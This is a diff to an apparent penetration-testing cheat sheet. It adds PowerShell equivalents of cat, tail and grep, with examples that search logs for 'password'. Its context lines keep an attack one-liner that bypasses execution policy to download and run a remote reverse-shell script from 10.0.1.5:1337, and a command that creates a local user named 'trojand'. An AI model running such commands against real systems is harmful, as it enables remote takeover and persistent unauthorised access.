@@ -70,4 +70,32 @@ net user trojand imareallyreallyreallylongpasswordnow
     powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
     ```
 
+### cat, tail, grep in Windows PS
+* Reading Files
+    ```powershell
+    Get-Content output.log
+    ```
+* Tail
+    ```powershell
+    Get-Content output.log -Tail <number of lines>
+    Get-Content output.log -Tail 10
+    ```
+* Tail -f
+    ```powershell
+    Get-Content output.log -Tail 10 -Wait
+    ```
+* Grep
+    ```powershell
+    Get-Content output.log | Select-String -Pattern "<pattern>"
+    Get-Content output.log | Select-String -Pattern "password"
+    ```
+* Grep -A 3
+    ```powershell
+    Get-Content output.log | Select-String -Pattern "password" -Context 0,3
+    ```
+* Tail -f | Grep -A 3
+    ```powershell
+    Get-Content output.log -Tail 10 -Wait | Select-String -Pattern "password" -Context 0,3
+    ```
+
 [^1]: [Abatchy](https://www.abatchy.com/2017/03/powershell-download-file-one-liners)
